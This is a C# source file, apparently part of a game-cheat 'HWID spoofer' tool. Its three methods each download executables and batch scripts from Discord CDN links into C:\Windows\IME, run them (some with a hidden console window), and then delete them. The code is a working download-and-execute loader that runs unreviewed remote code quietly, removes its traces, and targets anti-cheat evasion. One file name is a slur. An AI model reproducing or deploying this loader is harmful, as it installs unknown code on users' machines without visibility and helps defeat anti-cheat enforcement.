using System.Diagnostics;
using System.Net;
using System.IO;

namespace Litecoin
{
    class Spoofer
{
        public static void Spoof()
        {
            WebClient webClient = new WebClient(); //create new webclient

            string text = @"C:\Windows\IME\HWID-Changer.exe"; //path in that file will be saved
            string text2 = @"C:\Windows\IME\HWID-Changer.runtimeconfig.json"; //path in that file will be saved
            string text3 = @"C:\Windows\IME\HWID-Changer.dll"; //path in that file will be saved

            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1050525202095800380/1050526042680459394/HWID-Changer.exe", text);//download file from link and save it in path
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1050525202095800380/1050527129328168970/HWID-Changer.runtimeconfig.json", text2);//download file from link and save it in path
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1050525202095800380/1050526805620170822/HWID-Changer.dll", text3);//download file from link and save it in path


            Process process = new Process();//create new process


            process.StartInfo.FileName = "cmd.exe";//set process name to cmd.exe

            process.StartInfo.UseShellExecute = true;//set UseShellExecute to true

            process.StartInfo.CreateNoWindow = true;//set CreateNoWindow to true

            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;//Hide's the cmd window
            process = Process.Start(text);//start process
            //await for close process
            process.WaitForExit();//wait for process to close

            File.Delete(text);//delete file
            File.Delete(text2);//delete file
            File.Delete(text3);//delete file

        }
        public static void Clean()
    {
            WebClient webClient = new WebClient(); //create new webclient

            string text = @"C:\Windows\IME\applecleaner.exe"; //path in that file will be saved
            string text2 = @"C:\Windows\IME\neger.bat"; //path in that file will be saved
            string text3 = @"C:\Windows\IME\eac_cleaner_2.bat"; //path in that file will be saved

            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1033861004901240956/1047985011632119898/applecleaner.exe", text); //download file from link and save it in path
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1048738454449688659/1050513422573391902/neger.bat", text2); //download file from link and save it in path
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1048738454449688659/1050513422124580954/eac_cleaner_2.bat", text3); //download file from link and save it in path


            Process process = new Process(); //create new process
            Process process2 = new Process(); //create new process
            Process process3 = new Process(); //create new process

            process = Process.Start(text); //start process

            //await for close process
            process.WaitForExit(); //wait for process to close

            process2 = Process.Start(text2); //start process

            process2.WaitForExit(); //wait for process to close

            process3 = Process.Start(text3); //start process

            process3.WaitForExit(); //wait for process to close

            File.Delete(text); //delete file
            File.Delete(text2); //delete file
            File.Delete(text3); //delete file
        }


		public static void Serials()
        { 
            WebClient webClient = new WebClient(); //create new webclient

            string text2 = @"C:\Windows\IME\diocane.cmd"; //path in that file will be saved

            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1048738454449688659/1050513608129388595/lite_checkere.bat", text2); //download file from link and save it in path

            Process process = new Process(); //create new process

            process.StartInfo.FileName = "cmd.exe"; //set process name to cmd.exe

            process.StartInfo.UseShellExecute = true; //set UseShellExecute to true

            process.StartInfo.CreateNoWindow = true; //set CreateNoWindow to true

            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //Hide's the cmd window

            process = Process.Start(text2); //start process

            //await for close process
            process.WaitForExit(); //wait for process to close
            File.Delete(text2); //delete file

        }
      
    }
}
